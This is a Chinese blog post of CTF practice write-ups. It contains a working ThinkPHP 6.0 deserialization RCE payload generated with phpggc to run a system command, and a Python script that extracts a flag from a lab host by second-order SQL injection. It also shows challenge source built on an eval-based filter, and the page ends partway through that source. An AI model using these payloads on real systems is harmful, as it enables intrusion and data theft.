@@ -1,0 +1,1212 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='和网络安全 没啥关系'><title>刷题2</title>
+
+<link rel='canonical' href='https://proben1.github.io/2021/%E5%88%B7%E9%A2%982/'>
+
+<link rel="stylesheet" href="/scss/style.min.ddb7a2bc30312e4584c50c2205f5488bbcb69c747900d22926b3f0be637b190f.css"><meta property='og:title' content='刷题2'>
+<meta property='og:description' content='和网络安全 没啥关系'>
+<meta property='og:url' content='https://proben1.github.io/2021/%E5%88%B7%E9%A2%982/'>
+<meta property='og:site_name' content='茄子的养殖场'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='二次注入' /><meta property='article:tag' content='thinkphp' /><meta property='article:tag' content='js' /><meta property='article:published_time' content='2021-11-22T16:37:25&#43;08:00'/><meta property='article:modified_time' content='2021-11-22T16:37:25&#43;08:00'/>
+<meta name="twitter:title" content="刷题2">
+<meta name="twitter:description" content="和网络安全 没啥关系"><style>
+    :root {
+        --article-font-family: "Noto Serif SC", var(--base-font-family);
+    }
+</style>
+
+<script> 
+		(function () {
+		    const customFont = document.createElement('link');
+		    customFont.href = "https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@300;700&display=swap"; 
+		    customFont.type = "text/css";
+		    customFont.rel = "stylesheet";
+		
+		    document.head.appendChild(customFont);
+		}());
+</script>
+
+    </head>
+    <body class="
+    article-page
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    <!-- 
+        extended
+     -->
+    on-phone--column extended
+">
+    
+<div id="article-toolbar">
+    <a href="https://proben1.github.io/" class="back-home">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+        <span>Back</span>
+    </a>
+</div>
+    <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu5f6318bf2277bd145affa4ac152aafed_74595_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <h1 class="site-name"><a href="/">茄子的养殖场</a></h1>
+        <h2 class="site-description">完成一个名为大学的作品</h2><ol class="social-menu">
+                
+                    <li>
+                        <a 
+                            href='https://github.com/ProbeN1'
+                            target="_blank"
+                            title="GitHub"
+                        >
+                            
+                            
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                            
+                        </a>
+                    </li>
+                
+            </ol></header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E%E6%88%91/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于我</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>Dark Mode</span>
+            </li>
+        
+    </ol>
+</aside>
+
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                网络安全
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/2021/%E5%88%B7%E9%A2%982/">刷题2</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        和网络安全 没啥关系
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Nov 22, 2021</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-words">
+                    2289字
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="p5461-赦免战俘">P5461 赦免战俘</h1>
+<p>心态小裂，写了n遍，最后发现循环里忘加x，y了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">a <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(<span style="color:#8be9fd;font-style:italic">input</span>())
+b <span style="color:#ff79c6">=</span> [[<span style="color:#bd93f9">1</span> <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">2</span><span style="color:#ff79c6">**</span>a)] <span style="color:#ff79c6">for</span> j <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">2</span><span style="color:#ff79c6">**</span>a)]
+l <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2</span><span style="color:#ff79c6">**</span>a
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">func</span>(l,x,y):
+    <span style="color:#ff79c6">if</span> l <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span> :
+        <span style="color:#ff79c6">return</span> 
+
+    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(x,x<span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">int</span>(l<span style="color:#ff79c6">/</span><span style="color:#bd93f9">2</span>)) :
+        <span style="color:#ff79c6">for</span> j <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(y,y<span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">int</span>(l<span style="color:#ff79c6">/</span><span style="color:#bd93f9">2</span>)) :
+            b[i][j] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
+    
+    func(<span style="color:#8be9fd;font-style:italic">int</span>(l<span style="color:#ff79c6">/</span><span style="color:#bd93f9">2</span>),x<span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">int</span>(l<span style="color:#ff79c6">/</span><span style="color:#bd93f9">2</span>),y)
+    func(<span style="color:#8be9fd;font-style:italic">int</span>(l<span style="color:#ff79c6">/</span><span style="color:#bd93f9">2</span>),x,y<span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">int</span>(l<span style="color:#ff79c6">/</span><span style="color:#bd93f9">2</span>))
+    func(<span style="color:#8be9fd;font-style:italic">int</span>(l<span style="color:#ff79c6">/</span><span style="color:#bd93f9">2</span>),x<span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">int</span>(l<span style="color:#ff79c6">/</span><span style="color:#bd93f9">2</span>),y<span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">int</span>(l<span style="color:#ff79c6">/</span><span style="color:#bd93f9">2</span>))
+
+func(l,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>)
+<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">2</span><span style="color:#ff79c6">**</span>a):
+    <span style="color:#ff79c6">for</span> j <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">2</span><span style="color:#ff79c6">**</span>a):
+        <span style="color:#8be9fd;font-style:italic">print</span>(b[i][j],end<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34; &#34;</span>)
+    <span style="color:#8be9fd;font-style:italic">print</span>()
+</code></pre></div><h2 id="安洵杯-2019iamthinking">[安洵杯 2019]iamthinking</h2>
+<p>www.zip源码泄露，Thinkphp6.0，代码在app/controller/Index.php</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">&lt;?</span>php
+<span style="color:#ff79c6">namespace</span> app\controller;
+<span style="color:#ff79c6">use</span> app\BaseController;
+
+<span style="color:#ff79c6">class</span> <span style="color:#50fa7b">Index</span> <span style="color:#ff79c6">extends</span> BaseController
+{
+    <span style="color:#ff79c6">public</span> <span style="color:#ff79c6">function</span> <span style="color:#50fa7b">index</span>()
+    {
+        
+        <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;&lt;img src=&#39;../test.jpg&#39;&#34;</span><span style="color:#ff79c6">.</span><span style="color:#f1fa8c">&#34;/&gt;&#34;</span>;
+        <span style="color:#8be9fd;font-style:italic">$paylaod</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">@</span><span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#39;payload&#39;</span>];
+        <span style="color:#ff79c6">if</span>(isset(<span style="color:#8be9fd;font-style:italic">$paylaod</span>))
+        {
+            <span style="color:#8be9fd;font-style:italic">$url</span> <span style="color:#ff79c6">=</span> parse_url(<span style="color:#8be9fd;font-style:italic">$_SERVER</span>[<span style="color:#f1fa8c">&#39;REQUEST_URI&#39;</span>]);
+            parse_str(<span style="color:#8be9fd;font-style:italic">$url</span>[<span style="color:#f1fa8c">&#39;query&#39;</span>],<span style="color:#8be9fd;font-style:italic">$query</span>);
+            <span style="color:#ff79c6">foreach</span>(<span style="color:#8be9fd;font-style:italic">$query</span> <span style="color:#ff79c6">as</span> <span style="color:#8be9fd;font-style:italic">$value</span>)
+            {
+                <span style="color:#ff79c6">if</span>(preg_match(<span style="color:#f1fa8c">&#34;/^O/i&#34;</span>,<span style="color:#8be9fd;font-style:italic">$value</span>))
+                {
+                    <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#39;STOP HACKING&#39;</span>);
+                    <span style="color:#ff79c6">exit</span>();
+                }
+            }
+            unserialize(<span style="color:#8be9fd;font-style:italic">$paylaod</span>);
+        }
+    }
+}
+</code></pre></div><p>parse_url()</p>
+<p>1.//upload?如果是//，则被解析成host, 后面的内容如果有/,被解析出path，而不是query了</p>
+<p>2.如果path部分为///，则解析错误</p>
+<p>工具：https://github.com/wh1t3p1g/phpggc</p>
+<p>使用：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">./phpggc -l
+./phpggc -u ThinkPHP/RCE2  &#39;system(&#34;cat /flag&#34;);&#39;
+</code></pre></div><p>payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">///public/?payload=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00connection%22%3Bs%3A5%3A%22mysql%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3BN%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3BN%3Bs%3A18%3A%22%00think%5CModel%00force%22%3BN%3Bs%3A13%3A%22%00%2A%00connection%22%3BN%3Bs%3A9%3A%22%00%2A%00suffix%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00relation%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A10%3A%22%00%2A%00visible%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A200%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A20%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7Ds%3A8%3A%22function%22%3Bs%3A38%3A%22function+%28%29+use+%28%24code%29+%7Beval%28%24code%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3BN%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%220000000079ea1027000000003c8828b6%22%3B%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3BN%3B%7Ds%3A21%3A%22%00think%5CModel%00relation%22%3BN%3Bs%3A10%3A%22%00%2A%00visible%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3BN%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7D
+</code></pre></div><h2 id="网鼎杯2018unfinish">[网鼎杯2018]Unfinish</h2>
+<p>二次注入，注入点是在register.php传入的username中。</p>
+<p>1.猜测语句</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#ff79c6">insert</span> <span style="color:#ff79c6">table</span> <span style="color:#ff79c6">values</span> (<span style="color:#f1fa8c">&#39;email&#39;</span>,<span style="color:#f1fa8c">&#39;username&#39;</span>,<span style="color:#f1fa8c">&#39;password&#39;</span>)
+</code></pre></div><p>2.表名是猜的</p>
+<p>过滤了information</p>
+<p>mysql版本是<strong>5.5.64</strong>，sys 库在<strong>MySQL5.6</strong>或更高版本才有。</p>
+<p>3.每次都需要注意换邮箱</p>
+<p>4.过滤了逗号，不能闭合。</p>
+<p>要用from for</p>
+<p>5.+如果被识别成空格，可以用%2B。
+用异或也可以实现</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> requests
+<span style="color:#ff79c6">from</span> bs4 <span style="color:#ff79c6">import</span> BeautifulSoup
+<span style="color:#ff79c6">import</span> re
+
+url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://3facbb99-4fb4-44fa-8fae-fa28575f788a.node4.buuoj.cn:81/&#39;</span>
+a <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
+<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">60</span>):
+    email <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;eqwews1@131416024w&#39;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(i)
+    <span style="color:#6272a4">#insert table values (&#39;email&#39;,&#39;username&#39;,&#39;password&#39;)</span>
+    payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;0&#39; + ascii(substr((select * from flag) from &#34;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(i)<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34; for 1))+&#39;0&#34;</span>
+    register <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#39;email&#39;</span>:email,<span style="color:#f1fa8c">&#39;username&#39;</span>:payload,<span style="color:#f1fa8c">&#39;password&#39;</span>:<span style="color:#f1fa8c">&#39;0&#39;</span>}
+    login <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#39;email&#39;</span>:email,<span style="color:#f1fa8c">&#39;password&#39;</span>:<span style="color:#f1fa8c">&#39;0&#39;</span>}
+    r1 <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#39;register.php&#39;</span>,data <span style="color:#ff79c6">=</span> register)
+    r2 <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#39;login.php&#39;</span>, data <span style="color:#ff79c6">=</span> login,allow_redirects<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+    soup <span style="color:#ff79c6">=</span> BeautifulSoup(r2<span style="color:#ff79c6">.</span>text,<span style="color:#f1fa8c">&#39;html.parser&#39;</span>)
+    a<span style="color:#ff79c6">+=</span><span style="color:#8be9fd;font-style:italic">chr</span>(<span style="color:#8be9fd;font-style:italic">int</span>(soup<span style="color:#ff79c6">.</span>span<span style="color:#ff79c6">.</span>string<span style="color:#ff79c6">.</span>strip()))
+    <span style="color:#8be9fd;font-style:italic">print</span>(a)
+
+<span style="color:#6272a4">#print(soup.find_all(&#39;span&#39;))</span>
+<span style="color:#6272a4">#print(re.findall(&#34;.*?&lt;/span&gt;&#34;,r2.text)[0].replace(&#39;&lt;/span&gt;&#39;,&#39;&#39;).strip(),end=&#39;&#39;) 不用bs4用re硬找</span>
+</code></pre></div><h2 id="npuctf2020验证">[NPUCTF2020]验证🐎</h2>
+<p>js题，长知识了</p>
+<p>F12，ctrl+U查源码</p>
+<p>源码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#ff79c6">const</span> express <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#39;express&#39;</span>);
+<span style="color:#ff79c6">const</span> bodyParser <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#39;body-parser&#39;</span>);
+<span style="color:#ff79c6">const</span> cookieSession <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#39;cookie-session&#39;</span>);
+
+<span style="color:#ff79c6">const</span> fs <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#39;fs&#39;</span>);
+<span style="color:#ff79c6">const</span> crypto <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#39;crypto&#39;</span>);
+
+<span style="color:#ff79c6">const</span> keys <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#39;./key.js&#39;</span>).keys;
+
+<span style="color:#8be9fd;font-style:italic">function</span> md5(s) {
+  <span style="color:#ff79c6">return</span> crypto.createHash(<span style="color:#f1fa8c">&#39;md5&#39;</span>)
+    .update(s)
+    .digest(<span style="color:#f1fa8c">&#39;hex&#39;</span>);
+}
+
+<span style="color:#8be9fd;font-style:italic">function</span> saferEval(str) {
+  <span style="color:#ff79c6">if</span> (str.replace(<span style="color:#f1fa8c">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span style="color:#f1fa8c">&#39;&#39;</span>)) {
+    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">null</span>;
+  }
+  <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">eval</span>(str);
+} <span style="color:#6272a4">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个
+</span><span style="color:#6272a4"></span>
+<span style="color:#ff79c6">const</span> template <span style="color:#ff79c6">=</span> fs.readFileSync(<span style="color:#f1fa8c">&#39;./index.html&#39;</span>).toString();
+<span style="color:#8be9fd;font-style:italic">function</span> render(results) {
+  <span style="color:#ff79c6">return</span> template.replace(<span style="color:#f1fa8c">&#39;{{results}}&#39;</span>, results.join(<span style="color:#f1fa8c">&#39;&lt;br/&gt;&#39;</span>));
+}
+
+<span style="color:#ff79c6">const</span> app <span style="color:#ff79c6">=</span> express();
+
+app.use(bodyParser.urlencoded({ extended<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">false</span> }));
+app.use(bodyParser.json());
+
+app.use(cookieSession({
+  name<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;PHPSESSION&#39;</span>, <span style="color:#6272a4">// 2020.3/WORKER2 嘿嘿，给👴爪⑧
+</span><span style="color:#6272a4"></span>  keys
+}));
+
+<span style="color:#8be9fd;font-style:italic">Object</span>.freeze(<span style="color:#8be9fd;font-style:italic">Object</span>);
+<span style="color:#8be9fd;font-style:italic">Object</span>.freeze(<span style="color:#8be9fd;font-style:italic">Math</span>);
+
+app.post(<span style="color:#f1fa8c">&#39;/&#39;</span>, <span style="color:#8be9fd;font-style:italic">function</span> (req, res) {
+  <span style="color:#8be9fd;font-style:italic">let</span> result <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>;
+  <span style="color:#ff79c6">const</span> results <span style="color:#ff79c6">=</span> req.session.results <span style="color:#ff79c6">||</span> [];
+  <span style="color:#ff79c6">const</span> { e, first, second } <span style="color:#ff79c6">=</span> req.body;
+  <span style="color:#ff79c6">if</span> (first <span style="color:#ff79c6">&amp;&amp;</span> second <span style="color:#ff79c6">&amp;&amp;</span> first.length <span style="color:#ff79c6">===</span> second.length <span style="color:#ff79c6">&amp;&amp;</span> first<span style="color:#ff79c6">!==</span>second <span style="color:#ff79c6">&amp;&amp;</span> md5(first<span style="color:#ff79c6">+</span>keys[<span style="color:#bd93f9">0</span>]) <span style="color:#ff79c6">===</span> md5(second<span style="color:#ff79c6">+</span>keys[<span style="color:#bd93f9">0</span>])) {
+    <span style="color:#ff79c6">if</span> (req.body.e) {
+      <span style="color:#ff79c6">try</span> {
+        result <span style="color:#ff79c6">=</span> saferEval(req.body.e) <span style="color:#ff79c6">||</span> <span style="color:#f1fa8c">&#39;Wrong Wrong Wrong!!!&#39;</span>;
+      } <span style="color:#ff79c6">catch</span> (e) {
+        console.log(e);
+        result <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;Wrong Wrong Wrong!!!&#39;</span>;
+      }
+      results.unshift(<span style="color:#f1fa8c">`</span><span style="color:#f1fa8c">${</span>req.body.e<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">=</span><span style="color:#f1fa8c">${</span>result<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>);
+    }
+  } <span style="color:#ff79c6">else</span> {
+    results.unshift(<span style="color:#f1fa8c">&#39;Not verified!&#39;</span>);
+  }
+  <span style="color:#ff79c6">if</span> (results.length <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">13</span>) {
+    results.pop();
+  }
+  req.session.results <span style="color:#ff79c6">=</span> results;
+  res.send(render(req.session.results));
+});
+
+<span style="color:#6272a4">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
+</span><span style="color:#6272a4"></span>app.get(<span style="color:#f1fa8c">&#39;/source&#39;</span>, <span style="color:#8be9fd;font-style:italic">function</span> (req, res) {
+  res.set(<span style="color:#f1fa8c">&#39;Content-Type&#39;</span>, <span style="color:#f1fa8c">&#39;text/javascript;charset=utf-8&#39;</span>);
+  res.send(fs.readFileSync(<span style="color:#f1fa8c">&#39;./index.js&#39;</span>));
+});
+
+app.get(<span style="color:#f1fa8c">&#39;/&#39;</span>, <span style="color:#8be9fd;font-style:italic">function</span> (req, res) {
+  res.set(<span style="color:#f1fa8c">&#39;Content-Type&#39;</span>, <span style="color:#f1fa8c">&#39;text/html;charset=utf-8&#39;</span>);
+  req.session.admin <span style="color:#ff79c6">=</span> req.session.admin <span style="color:#ff79c6">||</span> <span style="color:#bd93f9">0</span>;
+  res.send(render(req.session.results <span style="color:#ff79c6">=</span> req.session.results <span style="color:#ff79c6">||</span> []))
+});
+
